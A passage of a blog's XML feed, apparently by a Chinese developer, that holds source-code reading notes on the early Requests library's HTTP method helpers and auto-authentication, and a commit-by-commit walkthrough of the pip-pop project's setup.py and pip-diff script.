:class:`Request`.</div><div class="line">    :param auth: (optional) AuthObject to enable Basic HTTP Auth.</div><div class="line">    """</div><div class="line">	<span class="comment"># 获取 Request对象</span></div><div class="line">    r = Request()</div><div class="line"></div><div class="line">	<span class="comment"># 设置基本的请求参数</span></div><div class="line">    r.method = <span class="string">'GET'</span></div><div class="line">    r.url = url</div><div class="line">    r.params = params</div><div class="line">    r.headers = headers</div><div class="line">	<span class="comment"># 设置认证信息</span></div><div class="line">    r.auth = _detect_auth(url, auth)</div><div class="line"></div><div class="line">	<span class="comment"># 发起请求</span></div><div class="line">    r.send()</div><div class="line"></div><div class="line">	<span class="comment"># 返回响应</span></div><div class="line">    <span class="keyword">return</span> r.response</div></pre></td></tr></table></figure>
<h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">head</span><span class="params">(url, params=&#123;&#125;, headers=&#123;&#125;, auth=None)</span>:</span></div><div class="line">    <span class="string">"""Sends a HEAD request. Returns :class:`Response` object.</span></div><div class="line"></div><div class="line">    :param url: URL for the new :class:`Request` object.</div><div class="line">    :param params: (optional) Dictionary of GET Parameters to send with the :class:`Request`.</div><div class="line">    :param headers: (optional) Dictionary of HTTP Headers to sent with the :class:`Request`.</div><div class="line">    :param auth: (optional) AuthObject to enable Basic HTTP Auth.</div><div class="line">    """</div><div class="line">	<span class="comment"># 获取 Request对象</span></div><div class="line">    r = Request()</div><div class="line"></div><div class="line">	<span class="comment"># 设置基本信息</span></div><div class="line">    r.method = <span class="string">'HEAD'</span></div><div class="line">    r.url = url</div><div class="line">    <span class="comment"># return response object</span></div><div class="line">    r.params = params</div><div class="line">    r.headers = headers</div><div class="line">    r.auth = _detect_auth(url, auth)</div><div class="line"></div><div class="line">	<span class="comment"># 发处请求</span></div><div class="line">    r.send()</div><div class="line"></div><div class="line">	<span class="comment"># 返回响应</span></div><div class="line">    <span class="keyword">return</span> r.response</div></pre></td></tr></table></figure>
<h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(url, data=&#123;&#125;, headers=&#123;&#125;, auth=None)</span>:</span></div><div class="line">    <span class="string">"""Sends a POST request. Returns :class:`Response` object.</span></div><div class="line"></div><div class="line">    :param url: URL for the new :class:`Request` object.</div><div class="line">    :param data: (optional) Dictionary of POST Data to send with the :class:`Request`.</div><div class="line">    :param headers: (optional) Dictionary of HTTP Headers to sent with the :class:`Request`.</div><div class="line">    :param auth: (optional) AuthObject to enable Basic HTTP Auth.</div><div class="line">    """</div><div class="line">	<span class="comment"># 获取Request对象</span></div><div class="line">    r = Request()</div><div class="line"></div><div class="line">	<span class="comment"># 设置基本信息</span></div><div class="line">    r.url = url</div><div class="line">    r.method = <span class="string">'POST'</span></div><div class="line">    r.data = data</div><div class="line"></div><div class="line">    r.headers = headers</div><div class="line">    r.auth = _detect_auth(url, auth)</div><div class="line"></div><div class="line">	<span class="comment"># 发起请求</span></div><div class="line">    r.send()</div><div class="line"></div><div class="line">	<span class="comment"># 返回响应</span></div><div class="line">    <span class="keyword">return</span> r.response</div></pre></td></tr></table></figure>
<h3 id="put"><a href="#put" class="headerlink" title="put"></a>put</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(url, data=<span class="string">''</span>, headers=&#123;&#125;, auth=None)</span>:</span></div><div class="line">    <span class="string">"""Sends a PUT request. Returns :class:`Response` object.</span></div><div class="line"></div><div class="line">    :param url: URL for the new :class:`Request` object.</div><div class="line">    :param data: (optional) Bytes of PUT Data to send with the :class:`Request`.</div><div class="line">    :param headers: (optional) Dictionary of HTTP Headers to sent with the :class:`Request`.</div><div class="line">    :param auth: (optional) AuthObject to enable Basic HTTP Auth.</div><div class="line">    """</div><div class="line">	<span class="comment"># 获取Request对象</span></div><div class="line">    r = Request()</div><div class="line"></div><div class="line">	<span class="comment"># 设置基本信息</span></div><div class="line">    r.url = url</div><div class="line">    r.method = <span class="string">'PUT'</span></div><div class="line">    r.data = data</div><div class="line"></div><div class="line">    r.headers = headers</div><div class="line">    r.auth = _detect_auth(url, auth)</div><div class="line"></div><div class="line">	<span class="comment"># 发起请求</span></div><div class="line">    r.send()</div><div class="line"></div><div class="line">	<span class="comment"># 返回响应</span></div><div class="line">    <span class="keyword">return</span> r.response</div></pre></td></tr></table></figure>
<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(url, params=&#123;&#125;, headers=&#123;&#125;, auth=None)</span>:</span></div><div class="line">    <span class="string">"""Sends a DELETE request. Returns :class:`Response` object.</span></div><div class="line"></div><div class="line">    :param url: URL for the new :class:`Request` object.</div><div class="line">    :param params: (optional) Dictionary of GET Parameters to send with the :class:`Request`.</div><div class="line">    :param headers: (optional) Dictionary of HTTP Headers to sent with the :class:`Request`.</div><div class="line">    :param auth: (optional) AuthObject to enable Basic HTTP Auth.</div><div class="line">    """</div><div class="line"></div><div class="line">	<span class="comment"># 获取Request对象</span></div><div class="line">    r = Request()</div><div class="line"></div><div class="line">	<span class="comment"># 设置基本信息</span></div><div class="line">    r.url = url</div><div class="line">    r.method = <span class="string">'DELETE'</span></div><div class="line">    <span class="comment"># return response object</span></div><div class="line"></div><div class="line">    r.headers = headers</div><div class="line">    r.auth = _detect_auth(url, auth)</div><div class="line"></div><div class="line">	<span class="comment"># 发起请求</span></div><div class="line">    r.send()</div><div class="line"></div><div class="line">	<span class="comment"># 返回响应</span></div><div class="line">    <span class="keyword">return</span> r.response</div></pre></td></tr></table></figure>
<h2 id="认证相关"><a href="#认证相关" class="headerlink" title="认证相关"></a>认证相关</h2><p>从上面的请求方法实现中，可以发现有的请求带了如<code>r.auth = _detect_auth(url, auth)</code><br><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/v020/7.jpg" alt=""></p>
<p>对于种种请求方法，我们不想在每次请求中都明确指出这次请求需不需要认证，但有些请求确实需要认证，因此在各种请求方法中都有一个可选参数<code>auth=None</code>，然后通过调用<code>r.auth = _detect_auth(url, auth)</code>来进一步设置。<code>_detect_auth</code>代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_detect_auth</span><span class="params">(url, auth)</span>:</span></div><div class="line">    <span class="string">"""Returns registered AuthObject for given url if available, defaulting to</span></div><div class="line">    given AuthObject."""</div><div class="line"></div><div class="line">    <span class="keyword">return</span> _get_autoauth(url) <span class="keyword">if</span> <span class="keyword">not</span> auth <span class="keyword">else</span> auth</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_autoauth</span><span class="params">(url)</span>:</span></div><div class="line">    <span class="string">"""Returns registered AuthObject for given url if available.</span></div><div class="line">    """</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (autoauth_url, auth) <span class="keyword">in</span> AUTOAUTHS:</div><div class="line">        <span class="keyword">if</span> autoauth_url <span class="keyword">in</span> url:</div><div class="line">            <span class="keyword">return</span> auth</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">None</span></div></pre></td></tr></table></figure>
<p>对于明确指出需要认证的请求，自然<code>auth</code>参数也会指定。如果<code>auth</code>参数没有指定，则会调用<code>_get_autoauth</code>来查看是否有对应的规则。这个规则列表则由全局变量<code>AUTOAUTHS</code>来维护，如果请求的url包含<code>autoauth_url</code>，则返回<code>autoauth_url</code>对应的auth。如果不包含，则直接返回<code>None</code>。</p>
<p>为了维护这个全局变量<code>AUTOAUTHS</code>，它实现了一个<code>add_autoauth</code>方法如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_autoauth</span><span class="params">(url, authobject)</span>:</span></div><div class="line">    <span class="string">"""Registers given AuthObject to given URL domain. for auto-activation.</span></div><div class="line">    Once a URL is registered with an AuthObject, the configured HTTP</div><div class="line">    Authentication will be used for all requests with URLS containing the given</div><div class="line">    URL string.</div><div class="line"></div><div class="line">    Example: ::</div><div class="line">        &gt;&gt;&gt; c_auth = requests.AuthObject('kennethreitz', 'xxxxxxx')</div><div class="line">        &gt;&gt;&gt; requests.add_autoauth('https://convore.com/api/', c_auth)</div><div class="line">        &gt;&gt;&gt; r = requests.get('https://convore.com/api/account/verify.json')</div><div class="line">        # Automatically HTTP Authenticated! Wh00t!</div><div class="line"></div><div class="line">    :param url: Base URL for given AuthObject to auto-activate for.</div><div class="line">    :param authobject: AuthObject to auto-activate.</div><div class="line">    """</div><div class="line">    <span class="keyword">global</span> AUTOAUTHS</div><div class="line"></div><div class="line">    AUTOAUTHS.append((url, authobject))</div></pre></td></tr></table></figure>
<h2 id="异常相关"><a href="#异常相关" class="headerlink" title="异常相关"></a>异常相关</h2><p>不做过多解释。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RequestException</span><span class="params">(Exception)</span>:</span></div><div class="line">    <span class="string">"""There was an ambiguous exception that occured while handling your request."""</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthenticationError</span><span class="params">(RequestException)</span>:</span></div><div class="line">    <span class="string">"""The authentication credentials provided were invalid."""</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">URLRequired</span><span class="params">(RequestException)</span>:</span></div><div class="line">    <span class="string">"""A valid URL is required to make a request."""</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">InvalidMethod</span><span class="params">(RequestException)</span>:</span></div><div class="line">    <span class="string">"""An inappropriate method was attempted."""</span></div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Requests v0.2.0 源码阅读&lt;/p&gt;
    
    </summary>
    
      <category term="编程之美" scheme="http://chybeta.github.io/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E7%BE%8E/"/>
    
    
      <category term="python" scheme="http://chybeta.github.io/tags/python/"/>
    
      <category term="requests" scheme="http://chybeta.github.io/tags/requests/"/>
    
      <category term="源码阅读" scheme="http://chybeta.github.io/tags/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>pip-pop 源码阅读</title>
    <link href="http://chybeta.github.io/2018/10/12/pip-pop-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <id>http://chybeta.github.io/2018/10/12/pip-pop-源码阅读/</id>
    <published>2018-10-12T11:26:27.000Z</published>
    <updated>2018-10-12T11:43:32.216Z</updated>
    
    <content type="html"><![CDATA[<p>pip-pop源码阅读</p>
<a id="more"></a>
<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/heroku-python/pip-pop" target="_blank" rel="external">https://github.com/heroku-python/pip-pop</a></p>
<p>按照commit记录来阅读。</p>
<h1 id="lawyer-up"><a href="#lawyer-up" class="headerlink" title="lawyer up"></a>lawyer up</h1><p>commit记录： a84bc7439770063e457760a18119c10e5d802d3e</p>
<p>添加了<code>LICENSE</code>文件，采用MIT License</p>
<h1 id="dummy-dir"><a href="#dummy-dir" class="headerlink" title="dummy dir"></a>dummy dir</h1><p>commit记录： 636935f9394165c1d55c0e0d878cea60428a434e</p>
<p>创建了 <code>pip_pop</code>文件夹，在其中创建空文件<code>__init__.py</code>。 此时项目结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── LICENSE</div><div class="line">└── pip_pop</div><div class="line">    └── __init__.py</div><div class="line"></div><div class="line">1 directory, 2 files</div></pre></td></tr></table></figure></p>
<h1 id="READ-IT"><a href="#READ-IT" class="headerlink" title="READ IT"></a>READ IT</h1><p>commit记录： ebdda7f8897403e9b77a2fa7023b2f4f8df1ecaa</p>
<p>项目结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">├── LICENSE</div><div class="line">├── README.rst</div><div class="line">└── pip_pop</div><div class="line">    └── __init__.py</div><div class="line"></div><div class="line">1 directory, 3 files</div></pre></td></tr></table></figure></p>
<p>增加了<code>README.rst</code>文件。用于说明该项目的用处，计划中实现的功能，未来可能实现的功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">pip-pop: tools for managing requirements files</div><div class="line">==============================================</div><div class="line"></div><div class="line">Planned Commands</div><div class="line">----------------</div><div class="line"></div><div class="line">Possible Future Commands</div><div class="line">------------------------</div></pre></td></tr></table></figure></p>
<h1 id="docopt"><a href="#docopt" class="headerlink" title="docopt"></a>docopt</h1><p>commit记录： f0e51cc56f55c4615e29b7a12264b20dbe12db66</p>
<p>项目结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── LICENSE</div><div class="line">├── README.rst</div><div class="line">├── pip_pop</div><div class="line">│   └── __init__.py</div><div class="line">└── requirements.txt</div><div class="line"></div><div class="line">1 directory, 4 files</div></pre></td></tr></table></figure></p>
<p>增加了<code>requirements.txt</code>文件。</p>
<h1 id="note-about-blacklisting-plans"><a href="#note-about-blacklisting-plans" class="headerlink" title="note about blacklisting plans"></a>note about blacklisting plans</h1><p>commit记录： bf54913eaa70f9f505c414a7be328ff15040f37f</p>
<p>项目结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── LICENSE</div><div class="line">├── README.rst</div><div class="line">├── pip_pop</div><div class="line">│   └── __init__.py</div><div class="line">└── requirements.txt</div><div class="line"></div><div class="line">1 directory, 4 files</div></pre></td></tr></table></figure></p>
<p>修改<code>READEME.rst</code>文件。</p>
<h1 id="Update-READEME-rst"><a href="#Update-READEME-rst" class="headerlink" title="Update READEME.rst"></a>Update READEME.rst</h1><p>commit记录： 2b444bc846071148dedf6773555e8b33f895765c</p>
<p>项目结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── LICENSE</div><div class="line">├── README.rst</div><div class="line">├── pip_pop</div><div class="line">│   └── __init__.py</div><div class="line">└── requirements.txt</div><div class="line"></div><div class="line">1 directory, 4 files</div></pre></td></tr></table></figure></p>
<p>修改<code>README.rst</code>文件</p>
<h1 id="exes"><a href="#exes" class="headerlink" title="exes"></a>exes</h1><p>commit记录： fd65e4d148939f1c7405370e1f342f1fa1b3ea14</p>
<p>项目结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── LICENSE</div><div class="line">├── README.rst</div><div class="line">├── bin</div><div class="line">│   ├── pip-diff</div><div class="line">│   └── pip-flatten</div><div class="line">├── pip_pop</div><div class="line">│   └── __init__.py</div><div class="line">├── requirements.txt</div><div class="line">└── setup.py</div><div class="line"></div><div class="line">2 directories, 7 files</div></pre></td></tr></table></figure></p>
<p>新增<code>bin/pip-diff</code>，<code>bin/pip-flatten</code>和<code>setup.py</code>。</p>
<p><code>bin/pip-diff</code>和<code>bin/pip-flatten</code>均是空文件。</p>
<p><code>setup.py</code>用于python库打包。代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="string">"""</span></div><div class="line">pip-pop manages your requirements files.</div><div class="line">"""</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup</div><div class="line"></div><div class="line"></div><div class="line">setup(</div><div class="line">    name=<span class="string">'pip-pop'</span>,</div><div class="line">    version=<span class="string">'0.0.0'</span>,</div><div class="line">    url=<span class="string">'https://github.com/kennethreitz/pip-pop'</span>,</div><div class="line">    license=<span class="string">'MIT'</span>,</div><div class="line">    author=<span class="string">'Kenneth Reitz'</span>,</div><div class="line">    author_email=<span class="string">'me@kennethreitz.org'</span>,</div><div class="line">    description=__doc__.strip(<span class="string">'\n'</span>),</div><div class="line">    <span class="comment">#packages=[],</span></div><div class="line">    scripts=[<span class="string">'bin/pip-diff'</span>, <span class="string">'bin/pip-flatten'</span>],</div><div class="line">    <span class="comment">#include_package_data=True,</span></div><div class="line">    zip_safe=<span class="keyword">False</span>,</div><div class="line">    platforms=<span class="string">'any'</span>,</div><div class="line">    install_requires=[<span class="string">'docopt'</span>],</div><div class="line">    classifiers=[</div><div class="line">        <span class="comment"># As from https://pypi.python.org/pypi?%3Aaction=list_classifiers</span></div><div class="line">        <span class="comment">#'Development Status :: 1 - Planning',</span></div><div class="line">        <span class="comment">#'Development Status :: 2 - Pre-Alpha',</span></div><div class="line">        <span class="comment">#'Development Status :: 3 - Alpha',</span></div><div class="line">        <span class="string">'Development Status :: 4 - Beta'</span>,</div><div class="line">        <span class="comment">#'Development Status :: 5 - Production/Stable',</span></div><div class="line">        <span class="comment">#'Development Status :: 6 - Mature',</span></div><div class="line">        <span class="comment">#'Development Status :: 7 - Inactive',</span></div><div class="line">        <span class="string">'Programming Language :: Python'</span>,</div><div class="line">        <span class="string">'Programming Language :: Python :: 2'</span>,</div><div class="line">        <span class="comment">#'Programming Language :: Python :: 2.3',</span></div><div class="line">        <span class="comment">#'Programming Language :: Python :: 2.4',</span></div><div class="line">        <span class="comment">#'Programming Language :: Python :: 2.5',</span></div><div class="line">        <span class="string">'Programming Language :: Python :: 2.6'</span>,</div><div class="line">        <span class="string">'Programming Language :: Python :: 2.7'</span>,</div><div class="line">        <span class="comment">#'Programming Language :: Python :: 3',</span></div><div class="line">        <span class="comment">#'Programming Language :: Python :: 3.0',</span></div><div class="line">        <span class="comment">#'Programming Language :: Python :: 3.1',</span></div><div class="line">        <span class="comment">#'Programming Language :: Python :: 3.2',</span></div><div class="line">        <span class="comment">#'Programming Language :: Python :: 3.3',</span></div><div class="line">        <span class="string">'Intended Audience :: Developers'</span>,</div><div class="line">        <span class="string">'Intended Audience :: System Administrators'</span>,</div><div class="line">        <span class="string">'License :: OSI Approved :: BSD License'</span>,</div><div class="line">        <span class="string">'Operating System :: OS Independent'</span>,</div><div class="line">        <span class="string">'Topic :: System :: Systems Administration'</span>,</div><div class="line">    ]</div><div class="line">)</div></pre></td></tr></table></figure></p>
<p>从<code>setuptools</code>导入<code>setup</code>函数，其中参数的含义如下：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:center">含义</th>
<th style="text-align:center">值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">name</td>
<td style="text-align:center">包名字</td>
<td style="text-align:center">pip-pop</td>
</tr>
<tr>
<td style="text-align:center">version</td>
<td style="text-align:center">包版本</td>
<td style="text-align:center">0.0.0</td>
</tr>
<tr>
<td style="text-align:center">url</td>
<td style="text-align:center">程序官网地址</td>
<td style="text-align:center"><a href="https://github.com/kennethreitz/pip-pop" target="_blank" rel="external">https://github.com/kennethreitz/pip-pop</a></td>
</tr>
<tr>
<td style="text-align:center">license</td>
<td style="text-align:center">授权信息</td>
<td style="text-align:center">MIT</td>
</tr>
<tr>
<td style="text-align:center">author</td>
<td style="text-align:center">程序作者</td>
<td style="text-align:center">Kenneth Reitz</td>
</tr>
<tr>
<td style="text-align:center">author_email</td>
<td style="text-align:center">作者邮箱</td>
<td style="text-align:center">me@kennethreitz.org</td>
</tr>
<tr>
<td style="text-align:center">description</td>
<td style="text-align:center">程序简单描述</td>
<td style="text-align:center">__doc__.strip(‘\n’)</td>
</tr>
<tr>
<td style="text-align:center">scripts</td>
<td style="text-align:center">指定可执行脚本，安装时脚本会被添加到系统PATH中</td>
<td style="text-align:center">[‘bin/pip-diff’, ‘bin/pip-flatten’]</td>
</tr>
<tr>
<td style="text-align:center">zip_safe</td>
<td style="text-align:center">不压缩包，以目录形式安装</td>
<td style="text-align:center">False</td>
</tr>
<tr>
<td style="text-align:center">platforms</td>
<td style="text-align:center">程序适合的平台</td>
<td style="text-align:center">‘any’</td>
</tr>
<tr>
<td style="text-align:center">install_requires</td>
<td style="text-align:center">安装时需要安装的依赖包</td>
<td style="text-align:center">[‘docopt’]</td>
</tr>
<tr>
<td style="text-align:center">classifiers</td>
<td style="text-align:center">分类信息</td>
<td style="text-align:center">详细见下</td>
</tr>
</tbody>
</table>
</div>
<h1 id="diffing-works"><a href="#diffing-works" class="headerlink" title="diffing works!"></a>diffing works!</h1><p>commit记录： d58196205cea3a4650d68443dd90132bbd4b2b4e</p>
<p>项目结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── LICENSE</div><div class="line">├── README.rst</div><div class="line">├── bin</div><div class="line">│   ├── pip-diff</div><div class="line">│   └── pip-flatten</div><div class="line">├── pip_pop</div><div class="line">│   └── __init__.py</div><div class="line">├── requirements.txt</div><div class="line">└── setup.py</div><div class="line"></div><div class="line">2 directories, 7 files</div></pre></td></tr></table></figure></p>
<p>更改了<code>bin/pip-diff</code>文件。代码整体的格式如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">"""Usage:</span></div><div class="line">  pip-diff (--fresh | --stale) &lt;reqfile1&gt; &lt;reqfile2&gt;</div><div class="line">  pip-diff (-h | --help)</div><div class="line"></div><div class="line">Options:</div><div class="line">  -h --help     Show this screen.</div><div class="line">  --fresh       List newly added packages.</div><div class="line">  --stale       List removed packages.</div><div class="line">"""</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> docopt <span class="keyword">import</span> docopt</div><div class="line"><span class="keyword">from</span> pkg_resources <span class="keyword">import</span> parse_requirements</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># <span class="doctag">TODO:</span> ignore lines</span></div><div class="line">IGNORABLE_LINES = <span class="string">'#'</span>, <span class="string">'-r'</span></div><div class="line">VERSION_OPERATORS = [<span class="string">'=='</span>, <span class="string">'&gt;='</span>, <span class="string">'&lt;='</span>, <span class="string">'&gt;'</span>, <span class="string">'&lt;'</span>, <span class="string">','</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">split</span><span class="params">(s)</span>:</span>...</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requirements</span><span class="params">(object)</span>:</span>...</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">diff</span><span class="params">(r1, r2, include_fresh=False, include_stale=False)</span>:</span>...</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>...</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<p>第一行<code>#!/usr/bin/env python</code>，用于为脚本语言指定解释器，这样可以直接<code>./*.py</code>的方式执行，不要使用<code>#!/usr/bin/python</code>，因为python可能不是安装在默认的环境。</p>
<p>第二行<code># -*- coding: utf-8 -*-</code>用于指定编码为 <code>utf-8</code>，这样可以在py文件中写中文，方便写注释和消息。</p>
<p>最下面的<code>if __name__ == &#39;__main__&#39;:</code>的意思是，当该py文件被直接运行时，<code>if __name__ == &#39;__main__&#39;:</code>之下的<code>main()</code>将被调用执行，当该py文件被以模块的形式导入时，<code>if __name__ == &#39;__main__&#39;:</code>不被运行。</p>
